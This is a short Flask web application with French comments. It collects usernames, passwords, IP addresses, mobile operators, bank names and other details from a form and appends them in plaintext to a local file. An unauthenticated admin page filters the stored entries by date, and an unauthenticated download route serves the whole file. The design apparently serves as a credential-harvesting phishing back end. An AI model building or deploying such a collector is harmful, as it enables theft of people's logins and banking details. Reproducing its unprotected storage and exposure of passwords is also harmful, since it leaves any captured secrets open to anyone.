from flask import Flask, render_template, request, redirect, url_for, send_file
from datetime import datetime

app = Flask(__name__)

# Page d'accueil avec le formulaire
@app.route('/')
def index():
    return render_template('index.html')

# Traitement du formulaire et enregistrement local
@app.route('/traitement', methods=['POST'])
def traitement():
    # Récupération des données du formulaire
    username = request.form.get('username')
    password = request.form.get('password')
    ip = request.form.get('ip')
    operator = request.form.get('operator')
    bank = request.form.get('bank')
    other_info = request.form.get('other_info')
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Formatage des données
    ligne = f"{timestamp} | {username} | {password} | {ip} | {operator} | {bank} | {other_info}\n"

    # Enregistrement dans le fichier local
    with open("data.txt", "a", encoding="utf-8") as f:
        f.write(ligne)

    # Redirection vers la page de confirmation
    return redirect(url_for('confirmation'))

# Page de confirmation après soumission
@app.route('/confirmation')
def confirmation():
    return render_template('confirmation.html')

# Page admin pour afficher et filtrer les données
@app.route('/admin', methods=['GET', 'POST'])
def admin():
    filtered_data = []
    selected_date = ""

    if request.method == 'POST':
        selected_date = request.form.get('date')
        try:
            with open("data.txt", "r", encoding="utf-8") as f:
                for line in f:
                    if selected_date in line:
                        filtered_data.append(line.strip())
        except FileNotFoundError:
            filtered_data = ["Aucune donnée enregistrée."]

    return render_template('admin.html', data=filtered_data, selected_date=selected_date)

# Route pour télécharger le fichier de données
@app.route('/download')
def download():
    return send_file("data.txt", as_attachment=True)